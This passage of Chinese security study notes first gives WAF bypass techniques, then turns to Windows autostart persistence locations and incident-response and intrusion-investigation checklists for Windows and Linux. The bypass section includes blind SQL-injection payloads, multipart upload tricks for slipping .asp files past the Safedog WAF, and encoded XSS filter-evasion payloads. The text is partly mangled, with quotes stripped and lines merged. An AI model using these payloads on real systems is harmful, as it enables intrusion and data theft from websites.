基于时间的盲注爆出字段值： 1’%00and (select case when (substr((!50010select((group_concat(COLUMN_NAME)))from((information_schema.columns))whereTABLE_NAME%3d%27users%27),1,1) like ‘d’) then sleep(3) else 0 end)%23 ## 基于时间的盲注提取数据： 1’%00*and (select case when (substr((*!50010select((group_concat(first_name)))from((users))),1,1) like ‘d’) then sleep(3) else 0 end)%23 3-12 http请求头设置分块传输(√)## 添加http头信息 ## Transfer-Encoding:chunked ## 依靠连续传输完成注入，分包过waf，但是到了服务器那边时，看到最后数长度为0时或者看到好几个回车换行符，表示数据传输完成。这个手段还是很不错的。这个需要你对数据传输的数据包非常熟悉才玩的出来。 3-13 也可以通过以下方法绕过Union - !Union Select - !!Select* Database() - !database**!!()* 使用这种方法SQL语句依然可以正确执行，而且会完美过狗！ 但是这里比较坑的一点是安全狗3.5版本会拦截关键字information_schema，这样利用起来就比较麻烦了，不过私神还是提供了一种方法绕过： 当mysql版本5.6时，可以用如下语句代替： Select table_name from mysql.innodb_table_stats where database_name database(); 3-14 sql语句中or和and替换绕过https://blog.csdn.net/weixin_46370858/article/details/114481900 3-12-4 waf文件上传检测方法(√)4-1 文件名前缀加[0x09]绕过——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; name”filepath”; filename”[0x09]backlion.asp” Content-Type: texthtml 4-2 文件名去掉双引号绕过：——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; name”filepath”; filenamebacklion.asp Content-Type: texthtml 4-3 添加一个filename1的文件名参数，并赋值绕过——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; name”filepath”; filename” backlion.asp”;filename1”test.jpg” Content-Type: texthtml 4-4 form变量改成f+orm组合绕过——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: f+orm-data; name”filepath”;filename”backlion.asp” Content-Type: texthtml 4-5 文件名后缀大小写绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; name”filepath”; filename”backlion.Asp” Content-Type: texthtml 4-6 去掉form-data变量绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: name”filepath”; filename”backlion.asp” Content-Type: texthtml 4-7 在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data ; name”filepath”; filename”backlion.asp” Content-Type: texthtml 或者 ——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data ; name”filepath”; filename”baclion.asp” Content-Type: texthtml 4-8 突破7 ，backlion.asp . (空格+.)绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; name”filepath”; filename”backlion.asp .” Content-Type: texthtml 4-9 突破8 ，“回车换行，绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; name”filepath”; filename”backlion.asp ” Content-Type: texthtml 4-10 突破9 ，NTFS流 在文件名后加::$DATA绕过——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; name”filepath”; filename”backlion.asp::$DATA” Content-Type: texthtml ——WebKitFormBoundary2smpsxFB3D0KbA7D ConTent-Disposition: form-data; name”filepath”; filename” backlion.asp::$DATA\\0x00\\fuck.asp0x00.jpg” Content-Type: texthtml 4-11 突破10 经过对IIS 6.0的测试发现，其总是采用第一个（也就是双文件上传）Content-Disposition 中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传backlion.asp成功]： Content-Disposition: form-data; name”FileUploadName”; filename”backlion.asp” —————————–15377259221471 Content-Disposition: form-data; name”FileUploadName”; filename”backlion.txt” Content-Type: applicationoctet-stream Content-Disposition: form-data; name”FileUploadName”; filename”backlion.asp” Content-Disposition: form-data; name”FileUploadName”; filename”backlion.asp” 4-12 突破11，将Content-Type和ConTent-Disposition调换顺序位置绕过——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Type: texthtml ConTent-Disposition: form-data; name”filepath”; filename”backlion.asp” 4-13 突破12，在文件名前缀加空格（tab键可替换）绕过：——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; name”filepath”; filename “backlion.asp” Content-Type: texthtml 4-14 突破13，在form-data加空格绕过——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data; name”uploaded”; filename”backlion.asp” Content-Type: texthtml 4-15 突破14，在form-data的前后加上+绕过：——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: +form-data; name”filepath”; filename”backlion.asp” Content-Type: texthtml ——WebKitFormBoundary2smpsxFB3D0KbA7D Content-Disposition: form-data+; name”filepath”; filename”backlion.asp” Content-Type: texthtml 3-12-5 waf工具绕过5-1 插件扩展Bypass WAF 伪造请求头的信息，通过waf也是很有效的，因为waf、尤其是云waf，发现请求来的ip地址是127.0.0.1，他会觉得是自己的ip地址来的请求，一般不会杀。 ## 什么是remote_addr ## remote_addr 是服务端根据请求TCP包的ip指定的。假设从client到server中间没有任何代理，那么web服务器（Nginx，Apache等）就会把client的IP设为IPremote_addr；如果存在代理转发HTTP请求，web服务器会把最后一次代理服务器的IP设置为remote_addr。 ## 什么是x_forwarded_for ## 当使用代理时，web服务器无法通过TCP数据包来源获得发起请求的client的真实IP，因此代理服务器通常会在http请求头增加一个叫做x_forwarded_for的字段，用来记录请求发起者的真实IP。在通过记录IP来防范web攻击时要注意。 5-2 HTTP参数污染## 对GET POST参数自动执行HPP攻击。相同的参数名，不同的参数值绕过。参考： https://www.cnblogs.com/--QAQ--/p/12846633.html 5-3 HTTP请求偷运(请求走私## 请求偷运也叫做请求走私，对每个请求自动执行HTTP请求走私攻击，其中将虚拟请求添加到开头，并在结尾添加真实（走私）请求。参考： https://blog.csdn.net/sycamorelg/article/details/122229109 ## 我们前面讲到的分块传输过waf，其实就是一个请求偷运的手段 5-4 XSS过狗https://cloud.tencent.com/developer/article/1595074 bodyonfocusalert(xss) top可以连接对象以及属性或函数 注，在goole浏览器实用 %2b为url编码的+%27”details%20open%20ontoggleeval(%27alert(1)%27) 通过字符串拼接函数来绕过 使用concat来拼接字符串javascript:alert(1) iframe safe_onload=location=’javascri’.concat(‘pt:aler’,’t(1)’) 其他： Base64编码： details open safe_ontoggle=eval(atob(‘YWxlcnQoMSk=’)) Unicode编码 eval拦截的话，可以试试，把 e Unicode编码 details open safe_ontoggle=\\u0065val(atob(‘YWxlcnQoMSk=’)) url编码： details open safe_ontoggle=%65%76%61%6c(atob(‘YWxlcnQoMSk=’)) url编码： details open safe_ontoggle=eval(‘%61%6c%65%72%74%28%31%29’) JS8编码： details open safe_ontoggle=eval(‘\\141\\154\\145\\162\\164\\50\\61\\51’) Ascii码绕过： details open safe_ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) alert(1)lt;/script Ascii编码 body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41)) 5-5 sqlmap过waf--tamper=python脚本文件 img src=网络安全.assets/image-20230818213655880.png alt=image-20230818213655880/ 3-12-6 如何识别WAF## 在请求中设置自己的cookie，例如：Citrix、Netscaler、Yunsuo WAF、safedog。 ## 在header中关联，例如：Anquanbao WAF、AmazonAWSWAF。 ## 经常更改标头和混乱的字符以使攻击者感到困惑，例如：Netscaler、Big-IP。 ## 在服务器头数据包中暴露自己，例如： Approach、WTS WAF。 ## 一些WAF在响应内容body中公开自身。例如：DotDefender、Armor、Sitelock。 ## 其他WAF会对恶意请求做出不寻常的响应代码答复。例如：WebKnight、360WAF。 ## 有些WAF会返回一堆垃圾数据。例如：百度云加速乐。 检测技术 ## 从浏览器发出普通的GET请求，拦截并记录响应头（特别是cookie）。 ## 从命令行（例如curl）发出请求，并测试响应内容和标头（不包括user-agent）。 # 向随机开放的端口发出GET请求，并抓住可能暴露WAF身份的标语。 # 如果某处有登录页面，表单页面等.请尝试一些常见的（易于检测的）有效负载，例如 or 1=1 -- - # 将../../../etc/passwd附加到URL末尾的随机参数 # 在url的末尾添加一些吸引人的关键字，如or sleep（5）‘ ## 使用过时的协议（如http/0.9）发出get请求（http/0.9不支持post类型查询）。 ## 很多时候，waf根据不同的交互类型改变服务器头。 ## 删除操作技术-发送一个原始的fin/rst包到服务器并识别响应。 ## 侧通道攻击-检查请求和响应内容的计时行为。 主流WAF指纹识别工具 wafw00f a href=https://github.com/enablesecurity/wafw00fhttps://github.com/enablesecurity/wafw00f/a identywaf a href=https://github.com/stamparm/identywafhttps://github.com/stamparm/identywaf/a sqlmap识别waf。 wafw00f 在kali中集成好了，如下： img src=网络安全.assets/image-20230818213902139.png alt=image-20230818213902139/ wafw00f http://101.132.222.28 identywaf ：这个就在工具文件夹中 img src=网络安全.assets/image-20230818213949279.png alt=image-20230818213949279/ sqlmap检测waf：之前用这个参数： --identify-waf ，但是这个选项已经被废弃了。 sqlmap源码：a href=https://github.com/sqlmapproject/sqlmaphttps://github.com/sqlmapproject/sqlmap/a 但是新版的sqlmap已经集成了上面的identywaf 的源码，所以sqlmap的waf探测功能其实还是靠的identywaf 。 3-13 随机启动项在注册表中的位置1）“启动”文件夹──最常见的自启动程序文件夹。 ## 它位于系统分区的“documents and Settings－－User－－〔开始〕菜单－－程序”目录下。这时的User指的是登录的用户名。 2）“All Users”中的自启动程序文件夹──另一个常见的自启动程序文件夹。 ## 它位于系统分区的“documents and Settings－－All User－－〔开始〕菜单－－程序”目录下。前面提到的“启动”文件夹运行的是登录用户的自启动程序，而“All Users”中启动的程序是在所有用户下都有效（不论你用什么用户登录）。 3）“Load”键值── 一个埋藏得较深的注册表键值。 ## 位于〔HKEY_CURRENT_USER\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\\load〕主键下。 4）“Userinit”键值──用户相关 ## 它则位于〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\Userinit〕主键下，也是用于系统启动时加载程序的。一般情况下，其默认值为“userinit.exe”，由于该子键的值中可使用逗号分隔开多个程序，因此，在键值的数值中可加入其它程序。 5）“Explorer\\Run”键值──与“load”和“Userinit”两个键值不同的是，“Explorer\\Run”同时位于〔HKEY_CURRENT_USER〕和〔HKEY_LOCAL_MACHINE〕两个根键中。它在两个中的位置分别为 ## （HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run〕下。 6）“RunServicesOnce”子键──它在用户登录前及其它注册表自启动程序加载前面加载。这个键同时位于 ## 〔HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce〕下。 7）“RunServices”子键──它也是在用户登录前及其它注册表自启动程序加载前面加载。这个键同时位于 ## 〔HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices〕下。 8）“RunOnce\\Setup”子键──其默认值是在用户登录后加载的程序。这个键同时位于 ## 〔HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setup〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setup〕下。 9）“RunOnce”子键──许多自启动程序要通过RunOnce子键来完成第一次加载。这个键同时位于 ## 〔HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce〕下。位于〔HKEY_CURRENT_USER〕根键下的RunOnce子键在用户登录扣及其它注册表的Run键值加载程序前加载相关程序，而位于〔HKEY_LOCAL_MACHINE〕主键下的Runonce子键则是在操作系统处理完其它注册表Run子键及自启动文件夹内的程序后再加载的。在Windows XP中还多出一个〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEX〕子键，其道理相同。 10）“Run”子键──目前最常见的自启动程序用于加载的地方。这个键同时位于## 〔HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run〕和〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run〕下。其中位于〔HKEY_CURRENT_USER〕根键下的Run键值紧接着〔HKEY_LOCAL_MACHINE〕主键下的Run键值启动，但两个键值都是在“启动”文件夹之前加载。 11）再者就是Windows中加载的服务了，它的级别较高，用于最先加载。其位于##〔HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services〕下，看到了吗，你所有的系统服务加载程序都在这里了！ 12）Windows Shell──系统接口它位于 ## 〔HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\〕下面的Shell字符串类型键值中，基默认值为Explorer.exe，当然可能木马程序会在此加入自身并以木马参数的形式调用资源管理器，以达到欺骗用户的目的。 如(explorer.exe c:\\1.exe) 13）BootExecute──属于启动执行的一个项目可以通过它来实现启动Natvice程序，Native程序在驱动程序和系统核心加载后将被加载，此时会话管理器(smss.exe)进行windowsNT用户模式并开始按顺序启动native程序 它位于注册表中 ## 〔HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Session Manager\\〕下面，有一个名为BootExecute的多字符串值键，它的默认值是autocheck autochk *，用于系统启动时的某些自动检查。这个启动项目里的程序是在系统图形界面完成前就被执行的，所以具有很高的优先级。 14）策略组加载程序──打开Gpedit.msc，展开“用户配置——管理模板——系统——登录”，就可以看到“在用户登录时运行这些程序”的项目，你可以在里面添加。在注册表中 ## [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\GroupPolicy Objects\\本地User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run] 你也可以看到相对应的键值。 15) windows映像劫持技术 ## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image FileExecution Options 在此项下面新建--项(123.exe),再到123.exe项下面新建--字符串(取名叫:debugger),debugger字符串里面填写任意文件(如:c:\\windows\\system32\\cmd.exe),最后打开123.exe发现变成打开cmd.exe了。 3-14 Windows其它木马、病毒加载项## 终端 win.ini 1、在Win.ini中启动 ## 在Win.ini的[windows]字段中有启动命令“load=”和“run=”，在一般情况下“＝”后面是空白的，如果有后跟程序，比方说是这个样子: run=c:\\windows\\file.exe load=c:\\windows\\file.exe ## 要小心了，这个file.exe很可能是木马。 2,在System.ini中启动 终端 system.ini ## System.ini位于Windows的安装目录下，其[boot]字段的shell=Explorer.exe是木马喜欢的隐蔽加载之所，木马通常的做法是将该句变为这样:shell=Explorer.exe window.exe，注意这里的window.exe就是木马程序。 ## 另外，在System.ini中的[386Enh]字段，要注意检查在此段内的“driver=路径\\程序名”，这里也有可能被木马所利用。再有，在System.ini中的[mic]、[drivers]、[drivers32]这三个字段，这些段也是起到加载驱动程序的作用，但也是增添木马程序的好场所。 3、在Autoexec.bat和Config.sys中加载运行，这个就不要看了 ## 但这种加载方式一般都需要控制端用户与服务端建立连接后，将已添加木马启动命令的同名文件上传到服务端覆盖这两个文件才行，而且采用这种方式不是很隐蔽，所以这种方法并不多见，但也不能因此而掉以轻心哦。 ## 他会在里面加入这样的命令:@echo off copy c:\\sys.lon c:\\windows\\StartMenu\\Startup Items\\del c:\\win.reg 4、启动组，这个我们一会看 ## 木马隐藏在启动组虽然不是十分隐蔽，但这里的确是自动加载运行的好场所，因此还是有木马喜欢在这里驻留的。启动组对应的文件夹为:C:\\Windows\\Start Menu\\Programs\\StartUp，在注册表中的位置:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders Startup=C:\\windows\\start menu\\programs\\startup。 3-15 Windows木马查杀总结注册表设置开启自启动的位置有很多。 查杀灰鸽子木马程序的应急响应过程： 1. 进行公司内部办公电脑安全检查的时候，发现有一个异常连接，对外连接的ip地址(攻击者的)是一个国内或者国外的ip地址。如果是国 外的就没有尝试溯源。 2. 排查 1、 查看进程连接和进程对应的pid，netstat -ano。 2、 查看pid对应程序的服务名：tasklist /svc，没有发现什么服务相关信息。 3、 通过xuetr(win7)，火绒剑(win10)，查看到该进程的签名和进程模块的前面都伪装的是微软的前面，但是服务没有签名，所以感 觉服务有问题。 4、 在注册表中删除服务信息、删除服务、结束进程、删除进程对应的程序文件。 5、查看启动项，发现没有什么问题 6、查看计划任务，也没有什么问题 启动项、服务、计划任务、伪造进程、主进程挂载dll文件等。。。 查杀pchare木马程序的应急响应过程： ## 公司同事或者甲方公司发现有一台电脑的cpu使用率很高，不知道怎么办，叫我们过去检查一下，发现有一个进程占用的cpu使用率很高，这个进程是svchost，查看了一下异常的进程连接，发现这个svchost进程有一个对外连接，ip地址呢不是该公司内部办公需要的一个连接地址，所以觉得它有异常，可能是中木马了。而这个木马的一直收发流量数据导致cpu使用率很高，电脑很卡。 1. 有异常连接 2. 查看异常连接进程对应的pid 3. 查看进程模块，也就是进程加载的dll文件，发现有一个dll文件没有签名，这就是那个木马程序的主程序文件，它是以驱动文件的形式 挂在到了svchost.exe这个系统主程序上。 4. 删除dll文件 5. 结束这个异常的svchost进程 6. 删除异常服务和注册表信息 7. 查看启动项，无异常 8. 查看计划任务，无异常 9. 查看用户没有异常 10. 远程连接没有开放 3-16 应急响应应急响应流程。 检查异常端口、进程信息、进程连接情况、异常连接进程的运行程序文件 查看可疑进程 找到对应程序文件 排查文件内容 干掉文件、杀掉进程 2. 入侵排查思路 1、查看账户信息：可疑账户 手工方式和工具(D盾、河马) 手工：注册表、net user、管理界面查看用户、查看用户的属组情况 2、结合日志(系统日志、安全日志(新建、登录、注销、退出等动作的日志))，查看管理员登录时间、用户名是否存在异常 如果服务器或者电脑对外提供了web服务，也就是有web项目，那么重点还要分析一下web日志记录 4、检查服务器是否有异常的启动项(注册表、启动项文件存放位置、组策略等等) 5、检查计划任务(定时任务) 6、服务自启动 溯源： 7、查看系统信息： a. 查看系统版本以及补丁信息 b. 查找可疑目录及文件(按照时间排序、分析最近打开分析可疑文件) 3-16 Windows入侵排查思路3-16-1 检查系统账号安全 1、查看服务器是否有弱口令，远程管理端口是否对公网开放。 ## 检查方法：据实际情况咨询相关服务器管理员。(或者用扫描器扫描) ## 我们也需要把信息收集起来，比如端口信息 2,查看服务器是否存在可疑账号、新增账号。 a.检查是否有多余账户，也可以通过指令来查看 net user b.检查guest账户权限 c.属组权限 3、查看服务器是否存在隐藏账号、克隆账号。就是在管理里面或者通过cmd，都不能看到的用户检查方法： regedit a、打开注册表 ，查看管理员对应键值。 找到SAM： img src=网络安全.assets/image-20230819135638736.png alt=image-20230819135638736/ 设置SAM权限 img src=网络安全.assets/image-20230819135655880.png alt=image-20230819135655880/ 刷新： img src=网络安全.assets/image-20230819135717200.png alt=image-20230819135717200/ 就可以展开了，然后找到Names，这是所有用户名，不管是不是隐藏的，这里是都可以看到的 img src=网络安全.assets/image-20230819135734472.png alt=image-20230819135734472/ b、使用D盾_web查杀工具，也可以杀web木马，集成了对克隆账号检测的功能。参考文档：https://www.linktrust.net/tools/163.html 4、结合日志，查看管理员登录时间、用户名是否存在异常。 a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”,这是操作系统日志。 b、导出Windows日志--安全，利用Log Parser进行分析。这个先不提了。 3-16-2 检查异常端口、进程1、检查端口连接情况，是否有远程连接、可疑连接。 检查方法： a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID” c.然后可以去磁盘上搜索这个文件，比如我搜索BaiduProtect.exe 2、进程 检查方法： a、开始--运行--输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间、CPU、内存等。一般CPU占用比较大的，可能有问题 b、打开D盾_web查杀工具，进程查看，关注没有签名信息(微软的签名，也就是微软信任的程序)的进程。 c、通过微软官方提供的 Process Explorer 等工具进行排查 。 d、查看可疑的进程及其子进程。可以通过观察以下内容：手工查杀难度比较大，一般都是配合工具来做，比如火绒剑。 没有签名验证信息的进程 没有描述信息的进程 进程的属主 进程的路径是否合法 CPU或内存资源占用长时间过高的进程 3、小技巧： a、查看端口对应的PID： netstat -ano | findstr “port” b、查看进程对应的PID：任务管理器--查看--选择列--PID 或者 tasklist | findstr “PID” c、查看进程对应的程序位置： 任务管理器--选择对应进程--右键打开文件位置 运行输入 wmic，cmd界面 输入 process d、tasklist /svc 进程--PID--服务 e、查看Windows服务所对应的端口： %system%/system32/drivers/etc/services（一般%system%就是C:\\Windows） 3-16-3 检查启动项、计划任务、服务1、检查服务器是否有异常的启动项。因为有些木马都是开启自启动的，不然下次开机他就没用了。 检查方法： ## a、登录服务器，单击【开始】【所有程序】【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 ## b、单击开始菜单 【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。 ## c、单击【开始】【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce 检查右侧是否有 ## 启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。 ## d、利用安全软件查看启动项、开机时间管理等。 ## e、组策略，运行gpedit.msc。 2、检查计划任务 检查方法： ## a、单击【开始】【设置】【控制面板】【任务计划】，查看计划任务属性，便可以发现木马文件的路径。好多木马都是在半夜偷偷启动。 ## b、单击【开始】【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。这个就不看了。 3、服务自启动 检查方法： ## 单击【开始】【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。有时候木马会以服务的方式来启动。 3-16-4 检查系统相关信息1、查看系统版本以及补丁信息 ## 检查方法：单击【开始】【运行】，输入systeminfo，查看系统信息、补丁信息等 img src=网络安全.assets/image-20230819140706310.png alt=image-20230819140706310/ 其实微软的补丁比较好打，开启自动更新，它就自己打了，如果不会，那么就用360安全卫士来打补丁，方法很多昂。 2、查找可疑目录及文件 检查方法： ## a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。可以查看时间 Window 2003 C:\\Documents and Settings，每创建一个用户，系统在这里都会创建一个对应名称的文件夹，自动记录一些信息。 Window 2008R2 C:\\Users\\ b、单击【开始】【运行】，输入%UserProfile%\\Recent，分析最近打开分析可疑文件。 c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 3-17 病毒处理工具3-17-1 病毒分析PCHunter：a href=http://www.xuetr.comhttp://www.xuetr.com/a 火绒剑：a href=https://www.huorong.cnhttps://www.huorong.cn/a Process Explorer：a href=https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorerhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer/a processhacker：a href=https://processhacker.sourceforge.io/downloads.phphttps://processhacker.sourceforge.io/downloads.php/a autoruns：a href=https://docs.microsoft.com/en-us/sysinternals/downloads/autorunshttps://docs.microsoft.com/en-us/sysinternals/downloads/autoruns/a OTL：a href=https://www.bleepingcomputer.com/download/otl/https://www.bleepingcomputer.com/download/otl//a 3-17-2 病毒查杀卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free （推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 3-17-3 病毒动态CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 3-17-4 在线病毒扫描网站http://www.virscan.org //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎 https://habo.qq.com //腾讯哈勃分析系统 https://virusscan.jotti.org //Jotti恶意软件扫描系统 http://www.scanvir.com //针对计算机病毒、手机病毒、可疑文件等进行检测分析 3-17-5 webshell查杀D盾_Web查杀：http://www.d99net.net/index.asp 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html Safe3：http://www.uusec.com/webshell.zip 3-18 linux 入侵排查3-18-1 账号安全1、用户信息文件 cat /etc/passwd ，如果里面内容比较多，我们使用 more /etc/passwd 2、影子文件 cat /etc/shadow ，这是个存密码的文件 root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: ## 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期的警告天数：密码过期之后的宽限天数：账号失效时间：保留没有密码的用户就看不到这么一大串字符了： $6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/ ## 两次密码的修改时间间隔：0表示没有修改过 ## 密码有效期：99999表示永不过期 ## #密码修改到期的警告天数：7表示7天内都会提醒你 注：linux的密码是双层加密的(加密和加盐)，不容易破解 who 查看当前登录用户（tty本地登陆 ,pts远程登录，比如用xshell这种工具连接登录上去的 w 查看系统信息，想知道某一时刻用户的行为 uptime 查看登陆多久、多少用户，负载 入侵排查 1、查询特权用户特权用户(uid 为0) [root@localhost ~]# awk -F: $3==0{print $1} /etc/passwd 2、查询可以远程登录的帐号信息 [root@localhost ~]# awk /\\$1|\\$6/{print $1} /etc/shadow 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more /etc/sudoers | grep -v ^#\\|^$ | grep ALL=(ALL) 4、禁用或删除多余及可疑的帐号 usermod -L user ## 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 user表示你查到的用户名 userdel user ## 删除user用户 userdel -r user ## 将删除user用户，并且将/home目录下的user目录一并删除，有些人入侵完成删除自己用户的时候，可能忘记了加-r，那么在/home目录下是有它用户名的文件夹的，也就是存有相关信息。 3-18-2 历史命令通过 .bash_history 查看帐号执行过的系统命令 1、root的历史命令 history 2、打开/home各帐号目录下的 .bash_history ，查看普通帐号的历史命令,为历史的命令增加登录的IP地址、执行命令时间等信息： 1）保存1万条命令，默认只保存1000条 sed -i s/^HISTSIZE=1000/HISTSIZE=10000/g /etc/profile 2）在 /etc/profile 的文件尾部添加如下行数配置信息： ######jiagu history xianshi######### USER_IP=who -u am i 2/dev/null | awk {print $NF} | sed -e s/[()]//g if [ $USER_IP = ] then USER_IP=hostnamefi export HISTTIMEFORMAT=%F %T $USER_IPwhoami` shopt -s histappend export PROMPT_COMMAND=history -a ######### jiagu history xianshi ########## 3), source /etc/profile 让配置生效 ## 再执行history指令，生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 第一条记录 什么时候执行的 哪个ip地址过来执行的 用的哪个用户 执行的什么指令 3、历史操作命令的清除： history -c ## 但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。入侵者如果能力比较强的，也会把这个文件情况。 3-18-3 端口使用netstat 网络连接命令，分析可疑端口、IP、PID netstat -antlp|more 查看下pid所对应的进程文件路径， 运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） 3-18-4 进程使用ps命令，分析进程 ps aux | grep pid 3-18-65开机启动项 /etc/inittab ## 查看系统的运行级别 /etc/rc.local /etc/rc.d/rc[06].d ## 各运行级别下的自启动文件 3-18-6 定时任务1、利用crontab创建计划任务crontab -l ## 列出某个用户cron服务的详细内容 Tips：## 默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root crontab -r ##删除每个用户cront任务(谨慎：删除所有的计划任务) crontab -e ## 使用编辑器编辑当前的crontab文件 如：/1 * echo hello world /tmp/test.txt ## 每分钟写入文件 2、利用anacron实现异步定时任务调度## 每天运行 /home/backup.sh 脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash/home/backup.sh ## 当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待7天。 重点关注以下目录中是否存在恶意脚本 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* 3-18-7 服务8-1 服务自启动第一种修改方法： chkconfig [--level 运行级别] [独立服务名] [on|off] chkconfig –level 2345 httpd on ## 开启自启动 chkconfig httpd on ## （默认level是2345） 第二种修改方法： 修改/etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start 入侵排查 1、查询已安装的服务： RPM包安装的服务 chkconfig --list ### 查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond ## 查看当前服务 系统在3与5级别下的启动项 chkconfig --list | grep 3:启用|5:启用 ## 